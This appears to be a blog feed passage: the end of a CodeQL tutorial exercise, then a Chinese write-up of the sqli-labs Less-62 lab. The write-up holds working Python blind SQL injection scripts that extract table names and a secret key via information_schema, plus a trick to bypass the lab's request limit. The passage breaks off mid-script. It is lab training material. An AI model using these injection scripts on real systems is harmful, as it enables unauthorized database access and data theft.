class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">import tutorial<br><br>Person descendant<span class="hljs-constructor">Of(Person <span class="hljs-params">p</span>)</span> &#123;<br>  p = parentOf+(result)<br>&#125;<br><br><span class="hljs-built_in">int</span> descendant<span class="hljs-constructor">Number(Person <span class="hljs-params">p</span>)</span> &#123;<br>  result = count(Person c <span class="hljs-pattern-match">| c = descendant<span class="hljs-constructor">Of(<span class="hljs-params">p</span>)</span> | c)</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">Person</span> p</span><br><span class="hljs-pattern-match">where descendant<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span> = max(<span class="hljs-constructor">Person</span> q | | descendant<span class="hljs-constructor">Number(<span class="hljs-params">q</span>)</span>)</span><br><span class="hljs-pattern-match">select p, descendant<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span></span><br></code></pre></div></td></tr></table></figure><h4 id="How-many-people-live-in-each-region-of-the-village"><a href="#How-many-people-live-in-each-region-of-the-village" class="headerlink" title="How many people live in each region of the village?"></a>How many people live in each region of the village?</h4><p>各地区分别有多少人居住：</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Location</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">Location</span>() &#123;<br>    <span class="hljs-keyword">this</span> in [<span class="hljs-string">&quot;east&quot;</span>, <span class="hljs-string">&quot;west&quot;</span>, <span class="hljs-string">&quot;south&quot;</span>, <span class="hljs-string">&quot;north&quot;</span>]<br>  &#125;<br>&#125;<br><br>from <span class="hljs-type">Location</span> location<br>select location, count(<span class="hljs-type">Person</span> p |  p.getLocation() = location | p)<br></code></pre></div></td></tr></table></figure><p>（查询结果不包含20位无地区的人员）</p><h4 id="Do-all-villagers-live-in-the-same-region-of-the-village-as-their-parents"><a href="#Do-all-villagers-live-in-the-same-region-of-the-village-as-their-parents" class="headerlink" title="Do all villagers live in the same region of the village as their parents?"></a>Do all villagers live in the same region of the village as their parents?</h4><p>找出跟他家长不住在同一地区的人：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import tutorial<br><br><br>from Person <span class="hljs-selector-tag">p</span>, Person c<br>where <span class="hljs-selector-tag">p</span> = <span class="hljs-built_in">parentOf</span>(c) and <span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.getLocation</span>() != c<span class="hljs-selector-class">.getLocation</span>()<br>select c<br></code></pre></div></td></tr></table></figure><h4 id="Find-out-whether-there-are-any-time-travelers-in-the-village-Hint-Look-for-“impossible”-family-relations"><a href="#Find-out-whether-there-are-any-time-travelers-in-the-village-Hint-Look-for-“impossible”-family-relations" class="headerlink" title="Find out whether there are any time travelers in the village! (Hint: Look for “impossible” family relations.)"></a>Find out whether there are any time travelers in the village! (Hint: Look for “impossible” family relations.)</h4><p>这个问题不太具体，我理解为：找出比他后代的年纪还小的人。</p><figure class="highlight csharp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function">import tutorial</span><br><span class="hljs-function"></span><br><span class="hljs-function">Person <span class="hljs-title">descendantOf</span>(<span class="hljs-params">Person p</span>)</span> &#123;<br>  p = parentOf+(result)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">from</span> Person p</span><br><span class="hljs-function"><span class="hljs-keyword">where</span> <span class="hljs-title">exists</span>(<span class="hljs-params">Person c | c = descendantOf(p</span>) <span class="hljs-keyword">and</span> p.<span class="hljs-title">getAge</span>() &lt; c.<span class="hljs-title">getAge</span>())</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> p, p.<span class="hljs-title">getAge</span>()</span><br><span class="hljs-function"></span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跟着CodeQL官方的&lt;a href=&quot;https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/#ql-tutorials&quot;&gt;QL tutorials&lt;/a&gt;做练习，在&lt;a href=&quot;https</summary>
      
    
    
    
    
    <category term="CodeQL" scheme="https://ovi3.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs靶场Less-62题解（少于130次）</title>
    <link href="https://ovi3.github.io/2020/12/04/sqli-labs-less-62/"/>
    <id>https://ovi3.github.io/2020/12/04/sqli-labs-less-62/</id>
    <published>2020-12-04T05:00:49.000Z</published>
    <updated>2024-07-21T05:46:47.714Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a>靶场Less-62题目，是通过布尔注入获取一段secret key，该key存于<code>challenges</code>数据库的某个随机表名的表内。要求在请求次数不超过130次的情况下获取该key。</p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>直接用docker搭建：<code>sudo docker run -dt --name sqli-lab -p 80:80 acgpiano/sqli-labs:latest</code></p><h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>该注入点是<code>id</code>参数，SQL语句上下文是<code>SELECT * FROM security.users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code>，注入时用<code>&#39;)</code>闭合。一般思路是先获取存key的表的表名，再获取key所在的列的列名，再获取key。表名有10个字符，由大写字母和数字构成；列名为<code>secret_4个字符</code>，这4个字符由大写字母和数字构成；secret key为24个字符，由大小写字母和数字构成。</p><p>下面的脚本采用二分法比较ASCII码来获取数据，请求次数在210次左右。而题目要求是130次内，不过请求不带Cookie可绕过了这个限制。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">表名：10个字符。有大写字母和数字构成</span><br><span class="hljs-string">列名：secret_接4个字符，这4个字符由大写字母和数字构成</span><br><span class="hljs-string">secret：24个字符，由大小写字母和数字构成</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>un_chars = string.digits + string.ascii_uppercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>uln_chars = string.digits + string.ascii_uppercase + string.ascii_lowercase  <span class="hljs-comment"># 按ASCII码从小到大排序</span><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">tmpl_payload, length, chars</span>):<br>    <span class="hljs-keyword">global</span> try_count<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>        left, right = <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(chars) - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> left &lt; right:<br>            m = (left + right) // <span class="hljs-number">2</span>  <span class="hljs-comment"># 左中位数</span><br>            payload = tmpl_payload % (i, <span class="hljs-built_in">ord</span>(chars[m]))<br>            resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>            try_count += <span class="hljs-number">1</span>  <span class="hljs-comment"># 统计请求个数</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                left = m + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                right = m<br>        result += chars[left]<br><br>    <span class="hljs-keyword">return</span> result<br><br><br>table_name = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">10</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">4</span>, un_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>secret_key = extract_data(<br>    <span class="hljs-string">&quot;1&#x27;) and ascii(substr((select &quot;</span> + column_name + <span class="hljs-string">&quot; from &quot;</span> + table_name+<span class="hljs-string">&quot;),%s,1))&gt;%d#&quot;</span>,<br>    <span class="hljs-number">24</span>, uln_chars<br>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure><h2 id="利用多状态"><a href="#利用多状态" class="headerlink" title="利用多状态"></a>利用多状态</h2><p>虽说上面可以绕过尝试次数限制，那如果就要尝试次数在130次内呢。</p><p>上面的二分法通过判断响应里是否有查询结果来判断注入的SQL语句为True或False，响应里有两种状态：有查询结果和无查询结果。其实响应里存在多个状态，id为1时返回的<code>Login name</code>为<code>Angelina</code>，为<code>2</code>时返回的是<code>Dummy</code>，还有为3，为4，为5等。假如我们要判断数据库里一个字符中的N个比特是什么，我们需要2的N次方个状态，如：我们要判断某串字符串第<code>i</code>个字符的第<code>j</code>位开始的三个比特是否为：000，001，010，011，100，101，110或111，写成SQL语句就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (2**j + 2**(j+1) + 2**(j+2))<br>    WHEN 0 THEN 1<br>    WHEN 2**j THEN 2<br>    WHEN 2**(j+1) THEN 3<br>    WHEN 2**(j+1) + 2**j THEN 4<br>    WHEN 2**(j+2) THEN 5<br>    WHEN 2**(j+2) + 2**j THEN 6<br>    WHEN 2**(j+2) + 2**(j+1) THEN 7<br>    ELSE 8<br>END<br></code></pre></div></td></tr></table></figure><p>因为users表里的数据有13条，也就是13个状态，大于8，小于16，所以每次请求通过比较8个状态获取3个比特的数据。</p><blockquote><p>一个小问题：为什么id为1时，返回的name是<code>Angelina</code>？而数据库里id为1的name是<code>Dumb</code>？</p><p>因为响应中返回的name是从硬编码在PHP代码里的数组里通过下标获取的，看代码：<a href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104">https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L104</a></p></blockquote><p>通过上面的思路，编写脚本如下。请求次数减少到114次。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, j</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的第 j 位开始的 3 个比特</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**j, <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>), query=query, bit_mark=<span class="hljs-number">2</span>**j + <span class="hljs-number">2</span>**(j+<span class="hljs-number">1</span>) + <span class="hljs-number">2</span>**(j+<span class="hljs-number">2</span>), i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot; &quot;</span>))<br>    <span class="hljs-comment"># print(payload)</span><br><br>    resp = requests.get(url, params=&#123;<span class="hljs-string">&quot;id&quot;</span>: payload&#125;)<br>    try_count += <span class="hljs-number">1</span><br><br>    info = &#123;<br>        <span class="hljs-string">&quot;Angelina&quot;</span>: <span class="hljs-string">&quot;000&quot;</span>,<br>        <span class="hljs-string">&quot;Dummy&quot;</span>: <span class="hljs-string">&quot;001&quot;</span>,<br>        <span class="hljs-string">&quot;secure&quot;</span>: <span class="hljs-string">&quot;010&quot;</span>,<br>        <span class="hljs-string">&quot;stupid&quot;</span>: <span class="hljs-string">&quot;011&quot;</span>,<br>        <span class="hljs-string">&quot;superman&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>        <span class="hljs-string">&quot;batman&quot;</span>: <span class="hljs-string">&quot;101&quot;</span>,<br>        <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;110&quot;</span>,<br>        <span class="hljs-string">&quot;admin1&quot;</span>: <span class="hljs-string">&quot;111&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;Your Login name : (.*?)&lt;br&gt;&quot;</span>, resp.text)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-keyword">match</span><br>    bits = info.get(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">assert</span> bits<br>    <span class="hljs-keyword">return</span> bits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_data</span>(<span class="hljs-params">query, length</span>):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        b3 = extract_bits(query, i, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 00000111</span><br>        b2 = extract_bits(query, i, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 00111000</span><br>        b1 = extract_bits(query, i, <span class="hljs-number">5</span>)  <span class="hljs-comment"># 11100000</span><br>        bit = b1[:<span class="hljs-number">2</span>] + b2 + b3<br>        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bit, <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    column_name = <span class="hljs-string">&quot;secret_&quot;</span> + extract_data(<br>        <span class="hljs-string">&quot;substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot;</span> + table_name + <span class="hljs-string">&quot;&#x27; limit 2,1),8,4)&quot;</span>,<br>        <span class="hljs-number">4</span><br>    )<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column_name:&quot;</span>, column_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select &quot;</span> + column_name + <span class="hljs-string">&quot; from challenges.&quot;</span> + table_name, <span class="hljs-number">24</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br><br></code></pre></div></td></tr></table></figure><h2 id="再减少点次数"><a href="#再减少点次数" class="headerlink" title="再减少点次数"></a>再减少点次数</h2><p>上面通过获取表名，再列名，再key。其实也可以不获取列名，只要知道表里有多少列，key所在的列在第几列即可，少点尝试次数。将上面main块的代码改成：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    table_name = extract_data(<span class="hljs-string">&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;</span>, <span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table_name:&quot;</span>, table_name)<br><br>    secret_key = extract_data(<span class="hljs-string">&quot;select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x&quot;</span> % table_name, <span class="hljs-number">24</span>)   <span class="hljs-comment"># 主要改的是这一句</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret_key:&quot;</span>, secret_key)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done. try_count:&quot;</span>, try_count)<br></code></pre></div></td></tr></table></figure><p>请求次数是102次。</p><h2 id="再减少些次数"><a href="#再减少些次数" class="headerlink" title="再减少些次数"></a>再减少些次数</h2><p>一般MySQL的表名是区分大小写的，而在字符串比较的时候是不区分大小写的。进到docker容器里（<code>sudo docker exec -it sqli-lab mysql</code>）执行下面SQL语句测试下：</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">use security<br><br>SELECT * FROM users;  # 返回了数据<br>SELECT * FROM userS;  # 报错，表名不存在<br>SELECT * FROM users WHERE username=&#x27;admin&#x27;;  # 返回admin<br>SELECT * FROM users WHERE username=&#x27;ADMIn&#x27;;  # 还是可以返回admin<br></code></pre></div></td></tr></table></figure><p>再看sqli-labs比较key是否正确的SQL语句（代码<a href="https://github.com/Audi-1/sqli-labs/blob/886b0dcc733c1a36caf10cfba076397b9e09ce7f/Less-62/index.php#L152">在这</a>）：</p><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> FROM $table <span class="hljs-keyword">WHERE</span> $col1= <span class="hljs-string">&#x27;$key&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>所以在获取key时，可以不管字母的大小写。而对于表名，它的构成是大写字母和数字，也用不着理会它的大小写。</p><p>再看数字、大写字母、小写字母的ASCII码的二进制格式：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">数字： 0011xxxx<br>大写： 010xxxxx<br>小写： 011xxxxx<br></code></pre></div></td></tr></table></figure><p>在获取表名或key时，我们判断第7位（比特）是不是1就知道该字符是数字或字母；而第6位不用管，因为对于数字，该位为1，对于字母，我们不用管字母的大小写也就不用管该位是0还是1。所以对于每个字符，我们只需获取第7位和前5位即可。</p><p>编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*-coding:utf-8-*-</span><br><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://192.168.197.133/Less-62/index.php&quot;</span>  <span class="hljs-comment"># 改成你的地址</span><br>try_count = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_bits</span>(<span class="hljs-params">query, i, bit_values: <span class="hljs-built_in">list</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取query执行结果的第 i 个（从1开始算）字符的3个比特</span><br><span class="hljs-string">    哪3个比特由bit_values指定</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> try_count<br><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(bit_values) == <span class="hljs-number">8</span><br>    bit_marks = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> bit_values:<br>        bit_marks |= v<br><br><br>    payload = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    &#x27;+(</span><br><span class="hljs-string">SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;)</span><br><span class="hljs-string">    WHEN &#123;0&#125; THEN 1</span><br><span class="hljs-string">    WHEN &#123;1&#125; THEN 2</span><br><span class="hljs-string">    WHEN &#123;2&#125; THEN 3</span><br><span class="hljs-string">    WHEN &#123;3&#125; THEN 4</span><br><span class="hljs-string">    WHEN &#123;4&#125; THEN 5</span><br><span class="hljs-string">    WHEN &#123;5&#125; THEN 6</span><br><span class="hljs-string">    WHEN &#123;6&#125; THEN 7</span><br><span class="hljs-string">    ELSE 8</span><br><span class="hljs-string">END</span><br><span class="hljs-string">)+&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(*bit_values[:<span class="hljs-number">7</span>], query=query, bit_mark=bit_marks, i=i)<br>    payload = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, payload.strip().replace(<span class="hljs-string">&quot;\n&quot;</span>, 